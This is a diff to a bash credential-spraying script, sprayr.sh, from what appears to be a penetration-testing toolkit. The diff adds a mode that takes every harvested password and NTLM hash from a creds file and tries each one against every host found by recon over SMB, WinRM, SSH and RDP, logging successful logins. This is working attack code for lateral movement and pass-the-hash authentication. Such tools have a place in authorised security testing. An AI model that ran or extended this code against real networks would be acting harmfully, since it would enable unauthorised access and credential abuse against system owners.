@@ -624,6 +624,7 @@ USAGE:
   ./sprayr.sh -u USER     -p PASS  -t TARGET [OPTIONS]
   ./sprayr.sh -U users.txt -p PASS  -t TARGET [OPTIONS]
   ./sprayr.sh -u USER     -H HASH  -t TARGET [OPTIONS]
+  ./sprayr.sh --from-creds    # spray ALL known creds vs ALL recon targets
 
 AUTHENTICATION:
   -u, --user USER         Single username
@@ -644,6 +645,8 @@ OPTIONS:
   --safe                  Add 2s jitter between attempts (lockout safety)
   --threads N             nxc thread count (default: 20)
   --timeout N             Per-protocol timeout seconds (default: 30)
+  --from-creds            Spray all creds from $TOOLKIT_ROOT/creds.txt against
+                          all targets from $TOOLKIT_ROOT/recon/ (SMB/WinRM/SSH/RDP)
   --outdir DIR            Output directory (default: ./spray/<timestamp>/)
   -h, --help              This help
 
@@ -674,6 +677,162 @@ NOTES:
   - hits.txt and pwnd.txt are written atomically — survive Ctrl+C
 
 EOF
+}
+
+#------------------------------------------------------------------------------
+# FROM-CREDS MODE: spray all known creds against all known targets
+#------------------------------------------------------------------------------
+FROM_CREDS_MODE=false
+
+parse_creds_file() {
+    # Reads $TOOLKIT_ROOT/creds.txt, outputs unique "user|credential|type" lines
+    local creds_file="${TOOLKIT_ROOT}/creds.txt"
+    if [[ ! -f "$creds_file" ]]; then
+        error "No creds file found at ${creds_file}"
+        error "Run adr.sh, crackr.sh, or sprayr.sh first to populate credentials."
+        return 1
+    fi
+    if [[ ! -s "$creds_file" ]]; then
+        error "Creds file is empty: ${creds_file}"
+        return 1
+    fi
+
+    # Format: TIMESTAMP | SOURCE | TARGET | USERNAME | CREDENTIAL | TYPE
+    # Fields are printf-padded, so strip whitespace
+    awk -F'|' '
+        NF >= 6 {
+            user = $4; gsub(/^[[:space:]]+|[[:space:]]+$/, "", user)
+            cred = $5; gsub(/^[[:space:]]+|[[:space:]]+$/, "", cred)
+            ctype = $6; gsub(/^[[:space:]]+|[[:space:]]+$/, "", ctype)
+            if (user != "" && cred != "") {
+                key = user "|" cred "|" ctype
+                if (!seen[key]++) print key
+            }
+        }
+    ' "$creds_file"
+}
+
+discover_recon_targets() {
+    # Outputs unique IPs from $TOOLKIT_ROOT/recon/*/
+    local recon_dir="${TOOLKIT_ROOT}/recon"
+    if [[ ! -d "$recon_dir" ]]; then
+        error "No recon directory found at ${recon_dir}"
+        error "Run recon.sh first to discover targets."
+        return 1
+    fi
+
+    local ip
+    for d in "${recon_dir}"/*/; do
+        ip="$(basename "$d")"
+        # Basic IP format check (not foolproof, just skip obvious non-IPs)
+        [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && echo "$ip"
+    done | sort -u
+}
+
+mode_from_creds() {
+    check_tools
+
+    phase "Credential Re-spray — all known creds vs all known targets"
+
+    # Discover targets
+    local targets_tmp
+    targets_tmp=$(mktemp /tmp/sprayr_respray_targets.XXXXXX)
+    discover_recon_targets > "$targets_tmp" || { rm -f "$targets_tmp"; return 1; }
+
+    local target_count
+    target_count=$(wc -l < "$targets_tmp")
+    if (( target_count == 0 )); then
+        error "No targets found in ${TOOLKIT_ROOT}/recon/"
+        rm -f "$targets_tmp"
+        return 1
+    fi
+    info "Discovered ${target_count} target(s) from recon data"
+
+    # Parse credentials
+    local creds_tmp
+    creds_tmp=$(mktemp /tmp/sprayr_respray_creds.XXXXXX)
+    parse_creds_file > "$creds_tmp" || { rm -f "$targets_tmp" "$creds_tmp"; return 1; }
+
+    local cred_count
+    cred_count=$(wc -l < "$creds_tmp")
+    if (( cred_count == 0 )); then
+        error "No credentials found in ${TOOLKIT_ROOT}/creds.txt"
+        rm -f "$targets_tmp" "$creds_tmp"
+        return 1
+    fi
+    info "Found ${cred_count} unique credential(s) to spray"
+    echo ""
+
+    # Show what we're about to do
+    echo -e "${BOLD}${CYAN}════════════════════════════════════════════════════════════${NC}"
+    echo -e "${BOLD}${CYAN}  sprayr.sh — Credential Re-spray${NC}"
+    echo -e "${BOLD}${CYAN}  Targets:     ${target_count} host(s) from recon${NC}"
+    echo -e "${BOLD}${CYAN}  Credentials: ${cred_count} unique cred(s) from creds.txt${NC}"
+    echo -e "${BOLD}${CYAN}  Protocols:   smb,winrm,ssh,rdp${NC}"
+    echo -e "${BOLD}${YELLOW}  Mode:        SAFE (sequential + per-cred)${NC}"
+    echo -e "${BOLD}${CYAN}════════════════════════════════════════════════════════════${NC}"
+    echo ""
+
+    # Set up shared targets file
+    RESOLVED_TARGETS_FILE="$targets_tmp"
+    SAFE_MODE=true
+    read -ra ACTIVE_PROTOS <<< "smb winrm ssh rdp"
+
+    local user cred ctype cred_num=0
+    while IFS='|' read -r user cred ctype; do
+        (( cred_num++ ))
+        phase "Credential ${cred_num}/${cred_count}: ${user}"
+
+        # Reset auth globals for this credential
+        AUTH_USER="$user"
+        AUTH_USER_FILE=""
+        AUTH_PASS=""
+        AUTH_HASH_RAW=""
+        NT_HASH=""
+        LM_NT_HASH=""
+
+        # Determine auth type
+        case "$ctype" in
+            *hash*|*NTLM*|*ntlm*)
+                AUTH_TYPE="hash"
+                AUTH_HASH_RAW="$cred"
+                if ! normalize_hash "$cred"; then
+                    warn "  Skipping invalid hash for ${user}: ${cred}"
+                    continue
+                fi
+                CRED_DISPLAY="${user}:<${NT_HASH:0:8}...>"
+                ;;
+            *)
+                AUTH_TYPE="password"
+                AUTH_PASS="$cred"
+                CRED_DISPLAY="${user}:${AUTH_PASS}"
+                ;;
+        esac
+
+        info "Spraying: ${CRED_DISPLAY}"
+
+        # Set per-cred output directory
+        OUTDIR="${TOOLKIT_ROOT}/spray/respray_$(date '+%Y%m%d_%H%M%S')_${user}"
+        mkdir -p -- "${OUTDIR}/raw" || continue
+        : > "${OUTDIR}/hits.txt"
+        : > "${OUTDIR}/pwnd.txt"
+
+        # Spray each protocol sequentially
+        local proto
+        for proto in "${ACTIVE_PROTOS[@]}"; do
+            spray_proto "$proto"
+        done
+
+        generate_next_steps 2>/dev/null || true
+        generate_summary 2>/dev/null || true
+    done < "$creds_tmp"
+
+    rm -f "$creds_tmp"
+    # Don't remove targets file here — cleanup trap handles it
+
+    echo ""
+    success "Re-spray complete. Check ${TOOLKIT_ROOT}/spray/respray_* for results."
+    success "All hits also logged to ${TOOLKIT_ROOT}/creds.txt"
 }
 
 #------------------------------------------------------------------------------
@@ -727,6 +886,8 @@ main() {
             --outdir)
                 [[ $# -lt 2 ]] && { error "--outdir requires an argument"; exit 1; }
                 OUTDIR="$2"; shift 2 ;;
+            --from-creds)
+                FROM_CREDS_MODE=true; shift ;;
             --no-color)
                 disable_colors; shift ;;
             -h|--help)
@@ -737,6 +898,12 @@ main() {
                 exit 1 ;;
         esac
     done
+
+    # From-creds mode: skip normal validation, run dedicated flow
+    if [[ "$FROM_CREDS_MODE" == true ]]; then
+        mode_from_creds
+        exit $?
+    fi
 
     #--- Validate inputs -------------------------------------------------------
     # User
